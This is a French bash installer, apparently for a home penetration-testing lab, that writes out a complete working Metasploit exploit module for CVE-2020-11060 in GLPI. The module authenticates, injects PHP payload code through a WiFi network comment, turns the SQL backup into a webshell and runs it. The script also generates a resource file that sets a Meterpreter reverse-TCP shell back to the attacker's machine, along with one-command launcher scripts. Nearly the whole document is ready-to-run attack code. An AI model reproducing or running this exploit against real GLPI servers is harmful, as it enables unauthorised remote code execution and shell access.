#!/bin/bash
#
# install_glpi_msf_module.sh
# Installation du module MSF pour CVE-2020-11060
# Lab Iron4Software - Philippe
#

set -e

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Installation Module MSF CVE-2020-11060${NC}"
echo -e "${GREEN}========================================${NC}"

# Configuration
KALI_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || echo "192.168.1.XXX")
TARGET_IP="192.168.1.250"
MODULE_DIR="$HOME/.msf4/modules/exploits/multi/http"
MODULE_FILE="$MODULE_DIR/glpi_cve_2020_11060.rb"

echo -e "\n${YELLOW}[1/5] Vérification de l'environnement...${NC}"
# Vérifier que Metasploit est installé
if ! command -v msfconsole &> /dev/null; then
    echo -e "${RED}Metasploit n'est pas installé !${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Metasploit détecté${NC}"

echo -e "\n${YELLOW}[2/5] Création du répertoire des modules...${NC}"
mkdir -p "$MODULE_DIR"
echo -e "${GREEN}✓ Répertoire créé : $MODULE_DIR${NC}"

echo -e "\n${YELLOW}[3/5] Création du module CVE-2020-11060...${NC}"
cat > "$MODULE_FILE" <<'RUBYMODULE'
##
# Module Metasploit pour CVE-2020-11060
# GLPI 0.85 - 9.4.5 RCE via Backup Functionality
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GLPI RCE via Backup Functionality (CVE-2020-11060)',
        'Description' => %q{
          This module exploits CVE-2020-11060 in GLPI versions 0.85 to 9.4.5.
          An authenticated user with technician privileges can execute arbitrary
          PHP code by creating a WiFi network with a malicious comment, then
          triggering a SQL backup that includes the payload.
          
          Lab: Iron4Software - Philippe Hassler
        },
        'Author' => [
          'AlmondOffSec',
          'Philippe Hassler (Iron4Software)'
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-11060'],
          ['URL', 'https://offsec.almond.consulting/playing-with-gzip-rce-in-glpi.html']
        ],
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'Targets' => [['Automatic', {}]],
        'Privileged' => false,
        'DisclosureDate' => '2020-03-30',
        'DefaultTarget' => 0,
        'DefaultOptions' => {'SSL' => false},
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to GLPI', '/glpi']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'tech']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'tech'])
    ])
  end

  def check
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path))
    return CheckCode::Unknown('No response') unless res

    if res.body =~ /GLPI\s+([\d.]+)/i
      version = Regexp.last_match(1)
      vprint_status("GLPI version: #{version}")
      
      if Rex::Version.new(version) <= Rex::Version.new('9.4.5') &&
         Rex::Version.new(version) >= Rex::Version.new('0.85')
        return CheckCode::Appears("GLPI #{version} is vulnerable")
      end
      return CheckCode::Safe("GLPI #{version} is patched")
    end
    CheckCode::Detected('GLPI detected')
  end

  def login
    print_status("Attempting login as #{datastore['USERNAME']}")
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'front', 'login.php')
    )
    fail_with(Failure::Unreachable, 'Could not connect') unless res

    csrf_token = res.body.scan(/name="_glpi_csrf_token" value="([a-f0-9]{32})"/).flatten.first
    fail_with(Failure::NotFound, 'No CSRF token') unless csrf_token

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'front', 'login.php'),
      'vars_post' => {
        'fielda733ab1bc0c6bc' => datastore['USERNAME'],
        'fieldb733ab1bc0c6be' => datastore['PASSWORD'],
        '_glpi_csrf_token' => csrf_token,
        'submit' => 'Post'
      }
    )
    fail_with(Failure::NoAccess, 'Auth failed') unless res && res.code == 302

    @cookie = res.get_cookies
    print_good("Authenticated as #{datastore['USERNAME']}")
    csrf_token
  end

  def create_wifi_payload
    print_status('Creating WiFi network with payload...')
    @shell_name = "#{Rex::Text.rand_text_alpha(8)}.php"
    
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'front', 'wifinetwork.form.php'),
      'cookie' => @cookie
    )

    csrf_token = res.body.scan(/name="_glpi_csrf_token" value="([a-f0-9]{32})"/).flatten.first || @csrf

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'front', 'wifinetwork.form.php'),
      'cookie' => @cookie,
      'vars_post' => {
        'name' => 'MSF-' + Rex::Text.rand_text_alpha(4),
        'essid' => 'RCE-' + Rex::Text.rand_text_numeric(4),
        'comment' => "<?php #{payload.encoded} ?>",
        '_glpi_csrf_token' => csrf_token,
        'add' => 'Add'
      }
    )
    print_good('WiFi network created')
  end

  def trigger_backup
    print_status('Triggering SQL backup...')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'front', 'backup.php'),
      'cookie' => @cookie,
      'vars_get' => {'dump' => 'dump'}
    )
    fail_with(Failure::Unknown, 'Backup failed') unless res

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'files', '_dumps'),
      'cookie' => @cookie
    )
    return unless res

    files = res.body.scan(/href="(glpi-backup-.*?\.sql\.gz)"/).flatten
    fail_with(Failure::Unknown, 'No backup file') if files.empty?

    @shell_path = normalize_uri(target_uri.path, 'files', '_dumps', files.last)
    print_good("Webshell: #{@shell_path}")
    register_file_for_cleanup(@shell_path)
  end

  def exploit
    @csrf = login
    create_wifi_payload
    trigger_backup
    
    print_status('Executing payload...')
    send_request_cgi('method' => 'GET', 'uri' => @shell_path, 'cookie' => @cookie)
    handler
  end
end
RUBYMODULE

echo -e "${GREEN}✓ Module créé : $MODULE_FILE${NC}"

echo -e "\n${YELLOW}[4/5] Création du script de lancement MSF...${NC}"
cat > "$HOME/exploit_glpi.rc" <<RCFILE
# Resource script pour exploitation GLPI CVE-2020-11060
# Lab Iron4Software

use exploit/multi/http/glpi_cve_2020_11060
set RHOSTS $TARGET_IP
set TARGETURI /glpi
set USERNAME tech
set PASSWORD tech
set LHOST $KALI_IP
set LPORT 4444
set payload php/meterpreter/reverse_tcp

# Vérifier la cible
check

# Lancer l'exploitation
exploit
RCFILE

echo -e "${GREEN}✓ Script RC créé : $HOME/exploit_glpi.rc${NC}"

echo -e "\n${YELLOW}[5/5] Création du script de lancement rapide...${NC}"
cat > "$HOME/pwn_glpi.sh" <<'BASHSCRIPT'
#!/bin/bash
# Script de lancement rapide pour exploitation GLPI
# Lab Iron4Software

echo "========================================="
echo "EXPLOITATION GLPI CVE-2020-11060"
echo "Lab Iron4Software - Philippe Hassler"
echo "========================================="
echo ""
echo "Target: 192.168.1.250"
echo "Module: exploit/multi/http/glpi_cve_2020_11060"
echo ""
echo "Lancement de Metasploit..."
echo ""

msfconsole -q -r ~/exploit_glpi.rc
BASHSCRIPT

chmod +x "$HOME/pwn_glpi.sh"
echo -e "${GREEN}✓ Script rapide créé : $HOME/pwn_glpi.sh${NC}"

# Créer aussi un script manuel
cat > "$HOME/manual_exploit_glpi.sh" <<'MANUAL'
#!/bin/bash
# Exploitation manuelle GLPI
echo "Lancement Metasploit en mode interactif..."
msfconsole -q -x "use exploit/multi/http/glpi_cve_2020_11060; show options"
MANUAL

chmod +x "$HOME/manual_exploit_glpi.sh"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}Installation terminée !${NC}"
echo -e "${GREEN}========================================${NC}"

echo -e "\n${BLUE}Informations :${NC}"
echo -e "  Target IP    : ${YELLOW}$TARGET_IP${NC}"
echo -e "  Kali IP      : ${YELLOW}$KALI_IP${NC}"
echo -e "  Module path  : ${YELLOW}$MODULE_FILE${NC}"

echo -e "\n${BLUE}Utilisation :${NC}"
echo -e "\n${YELLOW}Option 1 - Exploitation automatique :${NC}"
echo -e "  ${GREEN}~/pwn_glpi.sh${NC}"

echo -e "\n${YELLOW}Option 2 - Exploitation manuelle :${NC}"
echo -e "  ${GREEN}msfconsole -q -r ~/exploit_glpi.rc${NC}"

echo -e "\n${YELLOW}Option 3 - Mode interactif :${NC}"
echo -e "  ${GREEN}~/manual_exploit_glpi.sh${NC}"
echo -e "  Puis taper : ${GREEN}exploit${NC}"

echo -e "\n${YELLOW}Vérifier le module :${NC}"
echo -e "  ${GREEN}msfconsole -q -x 'use exploit/multi/http/glpi_cve_2020_11060; info'${NC}"

echo -e "\n${RED}IMPORTANT :${NC}"
echo -e "  Vérifie que ton IP Kali est bien : ${YELLOW}$KALI_IP${NC}"
echo -e "  Si ce n'est pas le cas, édite ${YELLOW}~/exploit_glpi.rc${NC}"

echo -e "\n${GREEN}Prêt pour l'exploitation ! 🚀${NC}"
